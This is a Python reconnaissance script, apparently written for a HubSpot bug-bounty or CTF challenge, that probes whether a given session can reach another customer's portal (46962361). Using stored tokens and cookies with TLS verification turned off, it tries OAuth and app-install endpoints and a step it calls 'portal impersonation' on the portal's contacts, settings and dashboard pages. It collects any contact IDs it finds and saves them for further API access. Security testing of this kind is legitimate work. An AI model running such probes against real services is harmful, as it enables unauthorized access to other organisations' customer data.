#!/usr/bin/env python3
"""
Find OAuth installation flow for portal 46962361
Look for ways to install the app or get proper authorization
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import re

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("SEARCHING FOR OAUTH/APP INSTALLATION METHODS")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. GET APP INFO FROM TOKEN
# ============================================================================

print("\n[1] EXTRACTING APP INFO FROM TOKEN")
print("="*80)

# Decode the token to get app ID
token_info_urls = [
    f'https://api.hubapi.com/oauth/v1/access-tokens/{ACCESS_TOKEN}',
    'https://api.hubapi.com/integrations/v1/me',
]

for url in token_info_urls:
    print(f"\n{url[:70]}...")

    try:
        r = requests.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  Response: {json.dumps(data, indent=2)[:600]}")

                # Extract app ID
                app_id = data.get('app_id') or data.get('hub_id') or data.get('client_id')

                if app_id:
                    print(f"\n  *** APP ID: {app_id} ***")

                    findings.append({
                        'type': 'app_info',
                        'app_id': app_id,
                        'data': data
                    })

                    # Try to get app details
                    app_url = f'https://app.hubspot.com/ecosystem/{app_id}/auth/authorize'

                    print(f"\n  Trying app authorization URL: {app_url}")

                    r2 = session.get(app_url, verify=False, timeout=10)

                    if r2.status_code == 200:
                        print(f"    *** APP AUTHORIZATION PAGE ACCESSIBLE! ***")
                        print(f"    Size: {len(r2.text)} bytes")
            except:
                print(f"  Response: {r.text[:300]}")
    except:
        pass

# ============================================================================
# 2. SEARCH FOR APP MARKETPLACE LISTING
# ============================================================================

print("\n" + "="*80)
print("[2] SEARCHING APP MARKETPLACE")
print("="*80)

marketplace_urls = [
    'https://app.hubspot.com/ecosystem/marketplace/apps',
    'https://ecosystem.hubspot.com/marketplace/apps',
]

for url in marketplace_urls:
    print(f"\n{url}")

    try:
        r = session.get(url, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  Size: {len(r.text)} bytes")

            # Look for CTF or test apps
            ctf_keywords = ['ctf', 'test', 'challenge', 'security']

            for keyword in ctf_keywords:
                if keyword in r.text.lower():
                    print(f"  Contains keyword: {keyword}")
    except:
        pass

# ============================================================================
# 3. TRY TO INSTALL APP ON TARGET PORTAL
# ============================================================================

print("\n" + "="*80)
print("[3] ATTEMPTING APP INSTALLATION")
print("="*80)

# Try different app installation endpoints
install_urls = [
    f'https://app.hubspot.com/ecosystem/install/{TARGET_PORTAL}',
    f'https://app.hubspot.com/install-integration/{TARGET_PORTAL}',
]

for url in install_urls:
    print(f"\n{url}")

    try:
        r = session.get(url, verify=False, timeout=10, allow_redirects=True)

        print(f"  Status: {r.status_code}")
        print(f"  Final URL: {r.url}")

        if r.status_code == 200:
            print(f"  *** INSTALLATION PAGE ACCESSIBLE! ***")

            # Look for app IDs or installation forms
            app_id_pattern = r'app[_-]?id["\s:=]+(\d+)'
            app_ids = re.findall(app_id_pattern, r.text, re.I)

            if app_ids:
                print(f"  Found app IDs: {set(app_ids)}")
    except:
        pass

# ============================================================================
# 4. CHECK FOR PUBLIC APP INSTALLATION LINK
# ============================================================================

print("\n" + "="*80)
print("[4] LOOKING FOR PUBLIC INSTALLATION LINK")
print("="*80)

# Sometimes apps have public installation URLs
public_install_patterns = [
    f'https://app.hubspot.com/oauth/authorize?client_id=APP_ID&redirect_uri=...',
    f'https://app.hubspot.com/ecosystem/APP_ID/install',
]

print("\nCommon installation URL patterns:")

for pattern in public_install_patterns:
    print(f"  {pattern}")

print("\nTo install an app, you typically need:")
print("  1. App/Client ID")
print("  2. Redirect URI")
print("  3. Scopes required")
print("  4. Authorization URL")

# ============================================================================
# 5. CHECK DEVELOPER ACCOUNT INFO
# ============================================================================

print("\n" + "="*80)
print("[5] CHECKING DEVELOPER ACCOUNT")
print("="*80)

dev_urls = [
    'https://app.hubspot.com/developer',
    'https://developers.hubspot.com/my-apps',
]

for url in dev_urls:
    print(f"\n{url}")

    try:
        r = session.get(url, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  Size: {len(r.text)} bytes")

            # Look for apps
            if 'app' in r.text.lower():
                print(f"  Contains 'app' keyword")

                # Try to extract app IDs
                app_id_pattern = r'"appId":\s*(\d+)'
                app_ids = re.findall(app_id_pattern, r.text)

                if app_ids:
                    print(f"  Found app IDs: {set(app_ids)}")

                    for app_id in set(app_ids):
                        print(f"\n  App {app_id}:")

                        # Try to get app details
                        details_url = f'https://api.hubapi.com/integrations/v1/apps/{app_id}'

                        r2 = requests.get(details_url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=5)

                        if r2.status_code == 200:
                            try:
                                details = r2.json()
                                print(f"    {json.dumps(details, indent=2)[:400]}")
                            except:
                                pass
    except:
        pass

# ============================================================================
# 6. TRY TO GET INSTALLATION TOKEN FOR TARGET PORTAL
# ============================================================================

print("\n" + "="*80)
print("[6] ATTEMPTING TO GET INSTALLATION TOKEN")
print("="*80)

# Try OAuth flow to get token for target portal
oauth_urls = [
    f'https://api.hubapi.com/oauth/v1/token',
]

print("\nNote: OAuth flow typically requires:")
print("  - Client ID")
print("  - Client Secret")
print("  - Authorization code")
print("  - Redirect URI")
print("\nWithout these, we cannot complete OAuth flow.")

# ============================================================================
# 7. CHECK IF WE CAN IMPERSONATE TARGET PORTAL
# ============================================================================

print("\n" + "="*80)
print("[7] TESTING PORTAL IMPERSONATION")
print("="*80)

# Try to access target portal pages directly
impersonate_urls = [
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/objects/0-1/views/all/list',
    f'https://app.hubspot.com/settings/{TARGET_PORTAL}/general',
    f'https://app.hubspot.com/dashboard/{TARGET_PORTAL}',
]

for url in impersonate_urls:
    print(f"\n{url[:70]}...")

    try:
        r = session.get(url, verify=False, timeout=10, allow_redirects=False)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")
            print(f"  Size: {len(r.text)} bytes")

            # Check if we actually got portal data
            if TARGET_PORTAL in r.text:
                print(f"  Contains target portal ID")

                # Look for contact IDs
                contact_pattern = r'/contact/(\d+)'
                contact_ids = re.findall(contact_pattern, r.text)

                if contact_ids:
                    unique_contacts = list(set(contact_ids))[:20]
                    print(f"  Found contact IDs: {unique_contacts}")

                    findings.append({
                        'type': 'portal_ui_access',
                        'portal': TARGET_PORTAL,
                        'url': url,
                        'contact_ids': unique_contacts
                    })
        elif r.status_code in [301, 302, 303, 307]:
            location = r.headers.get('Location', '')
            print(f"  Redirect to: {location}")
    except:
        pass

print("\n" + "="*80)
print("OAUTH/INSTALLATION SEARCH COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} ITEMS! ***\n")

    with open('/home/user/Hub/findings/OAUTH_FINDINGS.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:800]}")

        if finding.get('type') == 'portal_ui_access' and finding.get('contact_ids'):
            print(f"\n  *** TRY TO ACCESS THESE CONTACT IDs VIA API! ***")
else:
    print("\nNo OAuth/installation methods found.")
    print("\nThe CTF challenge may require:")
    print("  1. Credentials you don't have")
    print("  2. Access granted by challenge organizers")
    print("  3. A completely different approach")
    print("\nRecommend checking HackerOne platform for additional details.")
